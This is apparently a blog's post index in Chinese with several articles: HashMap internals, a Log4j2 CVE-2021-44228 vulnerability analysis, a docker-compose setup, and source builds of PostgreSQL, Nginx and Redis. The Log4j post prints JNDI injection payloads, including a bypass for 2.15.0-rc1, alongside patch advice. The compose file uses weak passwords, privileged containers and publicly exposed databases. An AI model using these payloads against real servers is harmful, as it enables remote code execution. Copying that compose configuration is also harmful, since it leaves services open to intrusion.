为什么hashMap的扩容一直是2的倍数？这个就要从如何在table里面的定位说起了，首先获取到key的hash，然后将(hash &amp; n-1)来定位到在table的位置，那么为什么要&amp;上n-1呢，我们都知道n是数组的长度，当n为2的倍数时候， 比如n=16，n-1的二进制就是1111，和hash进行逻辑与操作的时候，最后二进制的后四位决定了在table的位置。 当扩容一倍 也就是n=32的时候，n-1的二进制就是11111，和hash进行逻辑与操作的时候，最后二进制的后五位决定了在table的位置。 这就会造成一个现象，举个例子，比如说之前在2这个位置上的Node节点，原先是不管第五位二进制的，现在要管的话要么是0要么 是1，是0的话那么他的位置不变还是在2这个位置上，是1的话说明他在2+16=18的位置上。 这样在进行扩容操作的时候不需要像hashTable一样一个一个进行操作，只要对一个table节点里面的链表或者红黑树进行操作，要么还在当前位置，要么在当前+oldCap的位置。 hashMap是如何解决hash冲突的？hashMap是通过链地址法的方式解决hash冲突的，具体就是通过数组+链表（或红黑树）的方式。 解决hash冲突的几种办法：开发定址法、再hash法、链地址法、建立公共溢出区等。 参考文献： ​ https://tech.meituan.com/2016/06/24/java-hashmap.html HashTable遗留类，数组+链表(头插法)，使用synchronized确保线程安全，同时与ConcurrentHashMap相比性能低，扩容rehash过程是先生成一个新的entry数组，然后将旧的数据一个一个放进来。 ConcurrentHashMapLinkedHashMapWeakHashMapTreeMapEnumMap","tags":["Java"],"categories":["Java"]},{"title":"log4j2(CVE-2021-44228)漏洞分析","path":"/2021/12/12/log4j2-CVE-2021-44228-漏洞分析/","content":"介绍log4j 2是apache官方出品的日志框架，是对log4j的一个升级，目前在很多厂商的java项目中被广泛使用，影响力广泛，在2021年11月24日被阿里云团队发现。 漏洞编号：CVE-2021-44228 危害等级：严重 CVSS评分：10 影响版本：Apache Log4j 2.x &lt; 2.15.0 复现poc如下： 1234public static void main(String[] args) throws Exception &#123; System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;, &quot;true&quot;); logger.error(&quot;$&#123;jndi:ldap://127.0.0.1:1389/Exploit&#125;&quot;);&#125; 成功利用截图： 代码分析首先从logger.error()方法进去进入第一个关键点logIfEnabled方法，在当前方法的做了一个isEnabled判断，主要是将当前的日志打印级别（logger.error()就是error）和配置的默认级别比较，这也就是为什么logger.info不会触发，而logger.error()会。 然后沿着logMessage方法往下看，中间很多就跳过了，发现他会进入一个PatternLayout的方法，这个方法有很多个PatternFormatter对打印的日志进行格式处理，其中有个PatternFormatter里面有个converter对象的实现为MessagePatternConverter，这个也就是导致漏洞发生的类，在后面的log4j-2.15.0-rc1版本也就是对当前类做了修改。 然后来到MessagePatternConverter这个类的format方法。 可以看到上图红色方框里面的代码，当判断你打印的格式为 ${ 开头就进入replace的这个方法来进行替换，依次进入replace方法-&gt;substitute-&gt;substitute，发现有个resolveVariable的方法处理了变量。 进入resolveVariable方法，发现最后执行了resolver.lookup()的方法，resolver的实现是Interpolator这个类。 进入Interpolator，他通过对poc里面jndi:ldap://127.0.0.1:1389/Exploit获取第一个冒号之前的作为key来map中获取对应的LookUp，可以看到map中又这么多类型的LookUp，这里利用的是jndi的JndiLookUp这个类。 JndiLookUp中又有个JndiManager，又调用了JndiManager的lookUp方法 然后他会调用到LdapCtx的c_lookup方法获取到一个LdapResult对象。 然后调用DirectoryManager.getObjectInstance，这var3是个Reference类型。 在进入就是getObjectFactoryFromReference方法，这里面有class.forName()，然后就加载了类，同时也执行了命令。 最终的地方 整体下来有个疑惑的点，就是不知他通过ldap调过来的class文件放哪了，还需要深入学习，有师傅知道的话，感谢能够告知。 至此2.x到2.14.1版本的log4j漏洞复现完毕，接下来看log4j的log4j-2.15.0-rc1版本的绕过。 我开始clone log4j的源代码，并切换到log4j-2.15.0-rc1版本，发现大体上有两处的改动，第一处是前面有说过的MessagePatternConverter这个实现类，apache官方将这个类添加了四个内部实现类，并且将format这个方法在子类里面进行了实现，如下图所示。 format方法如下 会发现四个实现类里面有个LookupMessagePatternConverter的类就是利用点，如下图所示。 但是发现根本到不了这个LookupMessagePatternConverter类，默认去的是SimpleMessagePatternConverter。 我们想要的是进入LookupMessagePatternConverter这个类，所以我看了一下这个formatters的数据由来，发现他通过分析日志的pattern格式（如：%d{HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n ）来选择PatternConverter，比如发现有%d{HH:mm:ss.SSS}就会通过反射来创建一个DatePatternConverter类，所以我这里就想要通过配置文件来让反射出我想要的类，于是配置的xml文件如下，主要添加的就是%msg后面的{lookups}这个。 1234567891011121314&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;Configuration status=&quot;WARN&quot;&gt; &lt;Appenders&gt; &lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot;&gt; &lt;!-- 具体就是%msg后面的&#123;lookups&#125;这个会使后续的代码反射出LookupMessagePatternConverter --&gt; &lt;PatternLayout pattern=&quot;%d&#123;HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg&#123;lookups&#125;%n&quot;/&gt; &lt;/Console&gt; &lt;/Appenders&gt; &lt;Loggers&gt; &lt;Root level=&quot;error&quot;&gt; &lt;AppenderRef ref=&quot;Console&quot;/&gt; &lt;/Root&gt; &lt;/Loggers&gt;&lt;/Configuration&gt; 具体的解析代码如下，有兴趣可以自己去阅读一下源码： 满足如下条件既生成想要的类，也就是lookups这个为true，也就是loadLookups(options)这个方法里面当传入的options里面含有lookups字符串的时候返回true。 生成LookupMessagePatternConverter最终的调用链如下： 到此我们又成功用到了这个针对${}的解析，但是在进入JndiManager这个类的lookup里面发现前面加了很多东西，最终poc在下面红色框框的里面由于attributeMap中存在javaFactory这个key，导致直接return null，失败。 然后我看了一下log4j-2.15.0-rc2的修改，发现了一个点，他在代码提交中添加了如下代码，那就反向思维一下，log4j-2.15.0-rc1里面没有返回null，那我们只要让上面的new URI()这个方法爆出URISyntaxException这个异常并且不影响后面的使用就行，异常被捕获但是并未处理导致了这个绕过。 于是在原来的payload上面添加特殊字符绕过，poc如下logger.error(“${jndi:ldap://127.0.0.1:1389/Exploit/ }”); 到此结束，具体的利用过程就不发出来了，目前官方已经发布了2.15.0版本，大家及时更新。 全部调用链如下： poc测试代码地址：https://github.com/fireflyingup/log4j-poc安全建议1、排查应用是否引入了Apache log4j-core Jar包，若存在依赖引入，且在受影响版本范围内，则可能存在漏洞影响。请尽快升级Apache Log4j2所有相关应用到最新的 log4j-2.15.0 版本，地址 https://logging.apache.org/log4j/2.x/download.html 2、升级已知受影响的应用及组件，如 spring-boot-starter-log4j2/Apache Struts2/Apache Solr/Apache Druid/Apache Flink 3、临时缓解方案。可升级jdk版本至6u211 / 7u201 / 8u191 / 11.0.1以上，可以在一定程度上限制JNDI等漏洞利用方式。对于大于2.10版本的Log4j，可设置 log4j2.formatMsgNoLookups 为 True，或者将 JndiLookup 类从 classpath 中去除，例如 zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class 希望大家守好安全不要做坏事。 参考链接https://xz.aliyun.com/t/10649#toc-3 https://help.aliyun.com/noticelist/articleid/1060971232.html https://logging.apache.org/log4j/2.x/ https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce","tags":["漏洞分析"],"categories":["漏洞分析"]},{"title":"记一次docker-compose的使用","path":"/2021/10/29/记一次docker-compose的使用/","content":"什么是docker-compose?英文解释： Docker Compose is a tool for running multi-container applications on Docker defined using the Compose file format. A Compose file is used to define how the one or more containers that make up your application are configured. Once you have a Compose file, you can create and start your application with a single command: docker compose up. 也就是说docker-compose是一个工具，通过一个定义的compose文件格式来运行docker上的多容器应用程序，Compose 文件用于定义构成应用程序的一个或多个容器的配置方式，可以通过docker-compose up来启动docker应用程序，所以说docker-compose是一个很好的docker管理docker的东西，下面讲一次docker-compose的一次使用。 项目分析这里将要搭建一个常用的项目架构，使用的环境如下 nginx:1.18.0 jdk:1.8 postgresql:10.4 redis:5.0.13 这是一个最基础的项目情况，首先流量进入nginx，nginx做反向代理把流量转发给我们的项目（这里取名叫做fire），然后fire可以访问pgsql和redis。 环境准备安装docker，命令如下通过yum安装docker 1yum install docker 使用service服务运行docker 1systemctl start docker 判断docker是否启动成功 1234567docker -v# 出现下面信息 # Docker version 1.13.1, build 7d71120/1.13.1# 或者docker ps # 出现# CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 安装docker-compose工具去docker-compose的github上下载对应的tag，这里我们选择v2.0.1 点进去选择自己对应的服务器或者电脑版本下载，这里我是linux-x86_64的。 下载完之后会发现下下来的直接就可以使用，我们修改一下名字，并放入/usr/bin/目录下，这样就可以直接使用命令了。 123mv docker-compose-linux-x86_64 docker-compose # 修改名字，这里下下来的是直接可以用的，已经编译好了mv docker-compose /usr/bin/ # 将docker-compose移到/usr/bin目录下docker-compose -v # 测试一下，出现Docker Compose version v2.0.1即为成功 docker-compose.yml文件编写文件如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758version: &#x27;3&#x27; #版本services: redis: image: docker.io/redis:5.0.13 # 镜像名称，不知道可以docker search redis搜索一下，然后填入版本号可以去官方仓库查看，地址：https://hub.docker.com/search?q=java&amp;type=image privileged: true # 这里很重要，因为我项目是部署在非root用户下面，所以在我运行的时候一直报权限不足，加了这个就好了 container_name: redis # 容器名称 restart: always # 每次重启自动启动 environment: - TZ=Asia/Shanghai # 使用上海时区 volumes: - $&#123;HOME&#125;/data/redis:/data # 挂载映射，冒号前面的是你服务器的路径，后面的是docker容器里面的路径，两边做了一个映射 ports: - 0.0.0.0:6379:6379 # 端口映射，将本机的6379端口和docker容器的6379端口做了映射，0.0.0.0表示端口对外开放，服务器外可以访问。 command: redis-server --requirepass 123456 # 执行的命令，--requirepass 设置密码为123456 postgres: image: docker.io/postgres:10.4 privileged: true container_name: postgres restart: always environment: - TZ=Asia/Shanghai - POSTGRES_DB=sca # 设置pgsql的数据库名称 - POSTGRES_USER=sca # 设置pgsql的用户名，他有一个默认用户postgres - POSTGRES_PASSWORD=sca # 设置pgsql的密码 ports: - 0.0.0.0:5432:5432 volumes: - $&#123;HOME&#125;/data/postgresql:/var/lib/postgresql/data nginx: image: docker.io/nginx:1.18.0 privileged: true volumes: - $&#123;HOME&#125;/config/nginx/conf/nginx.conf:/etc/nginx/nginx.conf - $&#123;HOME&#125;/app/html:/usr/share/nginx/html # 前端的静态文件存放在服务器的$&#123;HOME&#125;/app/html下，会自动映射进docker里面的/usr/share/nginx/html ports: - 0.0.0.0:80:80 container_name: nginx links: - fire depends_on: - fire # 表示依赖于fire这个项目 fire: image: openjdk:8-jdk-alpine container_name: fire privileged: true ports: - 0.0.0.0:8081:8081 environment: - TZ=Asia/Shanghai volumes: - $&#123;HOME&#125;/app/fire-service.jar:/app/fire-service.jar command: java -jar -Dspring.profiles.active=dev /app/fire-service.jar # -Dspring.profiles.active=dev指定dev环境运行 links: - postgres - redis depends_on: - postgres - redis # 表示依赖于postgresql和redis 这里有几个地方要说一下 第一个是privileged: true，这里是由于我是非root用户使用docker-compose的，所以他在docker容器里面使用路径的话会出现权限不够的情况，使用这个就解决了这个问题，但是有一个其他的问题就是在服务器映射创建出来的文件变成了root权限，这个还有待优化去解决。 第二个是我后面出现了一个问题，问题如下 1fire | Error: Invalid or corrupt jarfile /app/fire-service.jar 这个问题出现有很多种情况，比如你映射的docker容器里面的路径和你启动命令的路径不对，也就是volumns冒号后面的路径和你command里面java -jar启动的路径不对。 在这里我是一种特殊的情况，是因为我使用的是非root用户，而且我的volumes里面使用了${HOME}，所以外面被映射到了/root目录下，而不是我的/home/myName目录下，排查这个问题的心理路程如下。 首先我猜想是不是我的docker-compose.yml文件有没有错误，在我仔细万分的肉眼识别之下，我确定是没有问题的，那么排查我文件的错误。 然后我在确定我docker-compose.yml文件下的映射没问题的情况下，我想查看我容器里面的包是否正确，但是容器无法启动，我无法通过 docker exec -it 容器名 bash 命令进入我的容器，所以我得想办法进入我的容器或者输出我这个容器的映射文件，于是我构造了以下command。 1command: ls -l /app &amp; java -jar -Dspring.profiles.active=dev /app/fire-service.jar # 主要目的是打印出fire-service.jar文件的大小，看看是不是文件损坏或者其他原因 结果发现了如下打印 12fire | total 0fire | drwxr-xr-x 2 root root 6 Oct 28 22:06 fire-service.jar 看见这个文件的大小只有6B，明显不对，我在仔细看我的docker-compose文件，发现了问题点，原来我是root用户启动的docker-compose up命令，导致${HOME}取了/root的值，后来su myName切换到普通用户，就成功了 最终docker ps发现项目全部启动 最后说一下docker-compose的常用命令 123docker-compose up # 启动docker-compose up -d # 后台启动docker-compose down # 关闭","tags":["docker-compose"],"categories":["docker"]},{"title":"Linux源码编译安装PostgreSql","path":"/2021/09/24/Linux源码编译安装PostgreSql/","content":"1、下载postgresql百度或者谷歌搜索postgresql download 点进去就是postgresql的官方下载页面，页面如下 如果你知道你自己的系统是什么，那么你就去上面蓝色框中选择自己系统对应的来进行下载，当然不知道的话，比如说你是arm的系统，这时候就要在自己的系统上使用源码编译，不然是无法使用的，这里就是要进行源码编译，所以我们选择Source code下面的file browser，也就是上图中的红色框。 点进去可以看到有很多postgresql的版本，这里我们选择10.4版本进行安装。 点击v10.4进去下载对应的压缩文件 当然也可以使用wget命令 12wget https://ftp.postgresql.org/pub/source/v10.4/postgresql-10.4.tar.gz #下载tar -zxvf postgresql-10.4.tar.gz #解压 2、编译安装postgresql在编译之前我们要先对编译所需要的环境进行安装 安装readline 123yum install readline-devel #yum安装# 或者sudo apt-get install libreadline6-dev 不安装可能会出现如下错误 安装zlib 1yum install zlib-devel 进入解压好的文件夹里面执行编译命令 123cd postgresql-10.4./configure --prefix=/root/target/postgre #指定编译目标文件夹make &amp;&amp; make install 3、安装完成1234[root@QLL3-5 postgre]# lsbin include lib share[root@QLL3-5 postgre]# pwd/root/target/postgre","tags":["postgresql"],"categories":["安装"]},{"title":"Linux源码编译安装Nginx","path":"/2021/09/24/Linux源码编译安装Nginx/","content":"1、nginx下载整个安装步骤可以直接采用官方的安装文档 使用wget命令下载nginx，这里以nginx 1.18.0 版本为例 12wget https://nginx.org/download/nginx-1.18.0.tar.gz #下载tar -zxvf nginx-1.18.0.tar.gz #解压 或者去nginx官网下载页面下载安装包，页面如下 2、必要模块安装下载PCRE，PCRE - Supports regular expressions. Required by the NGINX Core and Rewrite modules. 12wget https://ftp.pcre.org/pub/pcre/pcre-8.44.tar.gz #下载tar -zxvf pcre-8.44.tar.gz #解压 下载zlib, zlib - Supports header compression. Required by the NGINX Gzip module. 12wget http://zlib.net/zlib-1.2.11.tar.gz #下载tar -zxvf zlib-1.2.11.tar.gz #解压 可以看到当前文件夹下面有以下文件 接下来我们依次进行编译 编译pcre-8.44 12cd pcre-8.44./configure 发现以下报错 原因是没有gcc-c++编译环境，输入以下命令 123yum install gcc-c++#完成安装之后继续编译pcre./configure 出现如下页面表示成功 接下来执行以下命令，即pcre编译完成。 1make &amp;&amp; make install 编译zlib，执行过程和pcre一致，在这里不再重复。 123cd zlib-1.2.11./configuremake &amp;&amp; make install 3、编译安装nginx进入nginx目录，这里我选择将nginx编译后放入/root/target/nginx目录下面，这个目录你们可以自行配置，参数介绍官方的安装文档有很详细的介绍，这里我不在介绍。 12cd nginx-1.18.0./configure --sbin-path=/root/target/nginx --conf-path=/root/target/nginx/nginx.conf --pid-path=/root/target/nginx/nginx.pid --with-http_ssl_module --with-stream --with-pcre=../pcre-8.44 --with-zlib=../zlib-1.2.11 --without-http_empty_gif_module 在运行上述命令的时候我发现了另一个问题，这个是没有OpenSSL的环境。 我们执行以下命令来安装OpenSSL的环境 1yum -y install openssl openssl-devel 然后在继续执行就可以了 12./configure --sbin-path=/root/target/nginx --conf-path=/root/target/nginx/nginx.conf --pid-path=/root/target/nginx/nginx.pid --with-http_ssl_module --with-stream --with-pcre=../pcre-8.44 --with-zlib=../zlib-1.2.11 --without-http_empty_gif_modulemake &amp;&amp; make install 这样nginx的源码编译安装就大功告成了，附上一个nginx编译完成的截图。 再附上一个安装到目标文件夹的截图。 最后说一句，刚开始我准备使用nginx-1.9.15，可是后来在使用./configure的时候遇见了各种问题，后来就按照官方文档使用了稳定的nginx-1.18.0。 参考链接： nginx官方文档：https://docs.nginx.com/nginx/admin-guide/installing-nginx/installing-nginx-open-source/#sources 安装OpenSSL：https://blog.csdn.net/testcs_dn/article/details/51461999","tags":["nginx"],"categories":["安装"]},{"title":"Linux源码编译安装Redis","path":"/2021/09/24/Linux源码编译安装Redis/","content":"1、下载Redisredis版本：5.0.13 123wget https://download.redis.io/releases/redis-5.0.13.tar.gz #下载redistar -zxvf redis-5.0.13.tar.gz #解压cd redis-5.0.13 2、编译可以直接使用make &amp;&amp; make install，如果想要编译到指定文件夹的话，使用以下命令，注意一定要连在一起而且不能用&amp;&amp;，不然将不会编译到指定文件夹 1make CFLAGS=&quot;-g -O0&quot; PREFIX=/root/target/redis install 如果缺少gcc-c++环境的话，使用以下命令 1yum install gcc-c++ 3、编译完成可以看到最后在指定文件夹下面出现了bin文件夹，编译完成。 12345[root@QLL3-5 bin]# pwd/root/target/redis/bin[root@QLL3-5 bin]# lsredis-benchmark redis-check-aof redis-check-rdb redis-cli redis-sentinel redis-server[root@QLL3-5 bin]#","tags":["redis"],"categories":["安装"]}]